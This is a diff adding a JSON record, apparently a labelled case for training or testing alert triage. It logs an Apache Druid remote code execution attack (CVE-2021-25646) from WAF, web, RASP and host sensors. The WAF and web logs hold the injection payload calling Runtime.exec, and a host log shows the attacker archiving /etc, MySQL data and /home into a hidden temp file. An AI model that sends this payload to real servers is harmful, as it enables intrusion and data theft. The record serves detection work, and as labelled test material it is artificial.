@@ -1,0 +1,57 @@
+{
+ "unit": 1080,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Apache Druid JavaScript 过滤器远程代码执行 (CVE-2021-25646)",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-27 20:06:06",
+   "source": "waf",
+   "log_id": "WAF0385754",
+   "content": "/druid/indexer/v1/sampler {\"function\":\"function(){java.lang.Runtime.getRuntime().exec('id')}\"} Mozilla/5.0 (Ma",
+   "event_id": "1080-WAF0385754"
+  },
+  {
+   "timestamp": "2026-06-27 20:06:08",
+   "source": "web",
+   "log_id": "WEB0388264",
+   "content": "/druid/indexer/v1/sampler {\"function\":\"function(){java.lang.Runtime.getRuntime().exec('id')}\"} Mozilla/5.0 (Ma",
+   "event_id": "1080-WEB0388264"
+  },
+  {
+   "timestamp": "2026-06-27 20:06:10",
+   "source": "rasp",
+   "log_id": "RASP0426802",
+   "content": "https://app-java-153.ops-corp.com/druid/indexer/v1/sampler {\"javascript\": \"ProcessBuilder\", \"query\": \"sampler\"",
+   "event_id": "1080-RASP0426802"
+  },
+  {
+   "timestamp": "2026-06-27 20:07:07",
+   "source": "hids",
+   "log_id": "HID0418044",
+   "content": "id /usr/bin/id id <== /bin/sh -c 'id' <== java -server -jar /opt/druid/lib/druid.jar",
+   "event_id": "1080-HID0418044"
+  },
+  {
+   "timestamp": "2026-06-27 20:08:23",
+   "source": "hids",
+   "log_id": "HID0418050",
+   "content": "tar czf /tmp/.cache/a.tgz /etc /var/lib/mysql /home tar tar czf /tmp/.cache/a.tgz /etc /var/lib/mysq <== /usr/",
+   "event_id": "1080-HID0418050"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
